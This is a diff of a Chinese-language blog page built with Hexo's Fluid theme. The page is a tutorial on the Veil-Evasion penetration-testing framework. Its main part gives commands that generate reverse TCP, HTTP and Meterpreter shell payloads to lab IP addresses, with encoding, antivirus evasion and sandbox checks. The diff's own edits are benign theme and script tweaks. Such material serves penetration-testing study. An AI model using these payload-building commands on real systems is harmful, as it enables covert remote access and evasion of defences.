@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -233,32 +248,32 @@
 <figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">apt-get -y install veil-evasion          <span class="hljs-meta">#下载veil-evasion组件</span><br><span class="hljs-keyword">/usr/</span>share<span class="hljs-keyword">/veil/</span>config/setup.sh --force --silent    <span class="hljs-meta"># <span class="hljs-string">&quot;安静&quot;</span>的安装，不需要提示输入yes/no。安装需要很长时间，请耐心等待</span><br>veil     <span class="hljs-meta">#输入veil即可进行该模块</span><br></code></pre></div></td></tr></table></figure>
 <h1 id="1-Ordnance——军械库"><a href="#1-Ordnance——军械库" class="headerlink" title="1. Ordnance——军械库"></a>1. Ordnance——军械库</h1><p>我将在命令行中介绍如何在Veil中使用军械库，这应该非常简单。 如果你以前从未使用过军械库，那么该工具比msfvenom生成shellcode更加易用。</p>
 <h3 id="1-1-列出军械库的所有载荷"><a href="#1-1-列出军械库的所有载荷" class="headerlink" title="1.1 列出军械库的所有载荷"></a>1.1 列出军械库的所有载荷</h3><p><code>veil -t Ordnance --list-payloads</code></p>
-<p><img src="https://i.imgur.com/xTB5DVj.png" srcset="/img/loading.gif" alt="6"></p>
+<p><img src="https://i.imgur.com/xTB5DVj.png" alt="6"></p>
 <h3 id="1-2-列出军械库的所有编码模块"><a href="#1-2-列出军械库的所有编码模块" class="headerlink" title="1.2 列出军械库的所有编码模块"></a>1.2 列出军械库的所有编码模块</h3><p><code>veil -t Ordnance --list-encoders</code></p>
-<p><img src="https://i.imgur.com/wro0LR7.png" srcset="/img/loading.gif" alt="7"></p>
+<p><img src="https://i.imgur.com/wro0LR7.png" alt="7"></p>
 <h3 id="1-3-生成反弹TCP载荷"><a href="#1-3-生成反弹TCP载荷" class="headerlink" title="1.3 生成反弹TCP载荷"></a>1.3 生成反弹TCP载荷</h3><p><code>veil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234</code></p>
 <p>使用军械库模块，指定反弹的ip为192.168.1.20、端口为1234，生成反弹tcp载荷。</p>
-<p><img src="https://i.imgur.com/ra7MJcs.png" srcset="/img/loading.gif" alt="8"></p>
+<p><img src="https://i.imgur.com/ra7MJcs.png" alt="8"></p>
 <h3 id="1-4-生成反弹HTTP载荷"><a href="#1-4-生成反弹HTTP载荷" class="headerlink" title="1.4 生成反弹HTTP载荷"></a>1.4 生成反弹HTTP载荷</h3><p><code>veil -t Ordnance --ordnance-payload rev_http --ip 192.168.1.21 --port 1235 -e xor -b \\x13\\x98</code></p>
-<p><img src="https://i.imgur.com/JpQCrdB.png" srcset="/img/loading.gif" alt="9"></p>
+<p><img src="https://i.imgur.com/JpQCrdB.png" alt="9"></p>
 <p>使用军械库模块，指定反弹的ip为192.168.1.21、端口为1235，生成反弹http载荷。并且该命令还设置了xor编码、避免使用坏字符<code>\x13\x98</code></p>
 <h1 id="2-Evasion——免杀"><a href="#2-Evasion——免杀" class="headerlink" title="2. Evasion——免杀"></a>2. Evasion——免杀</h1><h3 id="2-1-列出免杀模块的所有载荷"><a href="#2-1-列出免杀模块的所有载荷" class="headerlink" title="2.1 列出免杀模块的所有载荷"></a>2.1 列出免杀模块的所有载荷</h3><p><code>veil -t Evasion --list-payloads</code></p>
-<p><img src="https://i.imgur.com/vCBa8bt.png" srcset="/img/loading.gif" alt="10"></p>
+<p><img src="https://i.imgur.com/vCBa8bt.png" alt="10"></p>
 <h3 id="2-2-使用33免杀模块生成可执行文件"><a href="#2-2-使用33免杀模块生成可执行文件" class="headerlink" title="2.2 使用33免杀模块生成可执行文件"></a>2.2 使用33免杀模块生成可执行文件</h3><p><code>veil -t Evasion -p 33 --ordnance-payload rev_tcp --ip 192.168.1.3 --port 8675 -o christest</code></p>
 <p>该命令会生成一个可执行的载荷。设置了免杀载荷编号为33。通过上一小节查询到<code>33) python/shellcode_inject/flat.py</code>，就可以指定<code>-p 33</code>。</p>
 <p>使用的是军械库反弹tcp的载荷，设置反弹IP<code>192.168.1.3</code>和<code>8675</code>，设置生成的文件名为<code>christest</code>。要注意的是，该命令使用的是Ordnance军械库模块来生成shellcode。</p>
 <h3 id="2-3-使用41免杀模块生成可执行文件"><a href="#2-3-使用41免杀模块生成可执行文件" class="headerlink" title="2.3 使用41免杀模块生成可执行文件"></a>2.3 使用41免杀模块生成可执行文件</h3><p><code>veil  -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris</code></p>
-<p><img src="https://i.imgur.com/NmIysDz.png" srcset="/img/loading.gif" alt="13"><br>使用指定ip和端口、免杀载荷为41，生成一个windows平台反弹meterpreter的载荷。和上一小节不同的是，使用的是msfvenom而不是军械库模块来生成shellcode。</p>
+<p><img src="https://i.imgur.com/NmIysDz.png" alt="13"><br>使用指定ip和端口、免杀载荷为41，生成一个windows平台反弹meterpreter的载荷。和上一小节不同的是，使用的是msfvenom而不是军械库模块来生成shellcode。</p>
 <p>生成的应用程序，可以使用<code>file var/lib/veil/output/compiled/chris.exe</code>进行查看。</p>
 <h3 id="2-4-使用34免杀模块生成可执行文件"><a href="#2-4-使用34免杀模块生成可执行文件" class="headerlink" title="2.4 使用34免杀模块生成可执行文件"></a>2.4 使用34免杀模块生成可执行文件</h3><p><code>veil -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c hostname=thegrid processors=2</code></p>
 <p>该命令会生成一个可执行的载荷。设置了免杀载荷编号为34。使用军械库模块生成反弹tcp的shellcode，反弹连接的IP、端口如命令所示。生成的可执行程序名称为chrisout，并且执行了两项检查，载荷被设置为目标机器的主机名为thegrid，系统的进程至少是2个。</p>
 <p>如果你只想检查主机名，就可以删除<code>processors=2</code>，内置这样的基本检查，当尝试枚举和绕过沙箱的时候很有用。</p>
 <p>如果是使用python免杀模块，编号从25到36，那么编译的时候很可能出错。</p>
-<p><img src="https://i.imgur.com/r7HlAhR.png" srcset="/img/loading.gif" alt="12"></p>
+<p><img src="https://i.imgur.com/r7HlAhR.png" alt="12"></p>
 <p>当出现错误，<code>ImportError: No module named &#39;past&#39;</code></p>
 <p>可以使用以下命令，手动将py脚本编译为exe，生成的程序在build文件夹下。</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wine pyinstaller <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/veil/</span>output<span class="hljs-regexp">/source/</span>chrisout10.py<br></code></pre></div></td></tr></table></figure>
-<p><img src="https://i.imgur.com/tBCTchf.png" srcset="/img/loading.gif" alt="11"></p>
+<p><img src="https://i.imgur.com/tBCTchf.png" alt="11"></p>
 <p>如果出现了上图的错误，可以安装<code>apt-get install winbind</code></p>
 <h3 id="2-5-删除所有生成的载荷"><a href="#2-5-删除所有生成的载荷" class="headerlink" title="2.5 删除所有生成的载荷"></a>2.5 删除所有生成的载荷</h3><p><code>veil  --clean</code></p>
 <p> 如果您创建了多个有效负载，并且只想删除所有编译后的输出，源代码，处理程序文件和跟踪的哈希，请运行此命令，Veil将删除所有内容。</p>
@@ -287,9 +302,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/02/26/50409.html">
+                      <a href="/2020/02/28/46599.html">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Msfvenom Payload免杀</span>
+                        <span class="hidden-mobile">记TK教主教导的学习方法</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -297,8 +312,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/02/24/29676.html">
-                        <span class="hidden-mobile">可修改的开机自启文件夹</span>
+                      <a href="/2020/02/26/50409.html">
+                        <span class="hidden-mobile">Msfvenom Payload免杀</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -398,10 +413,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
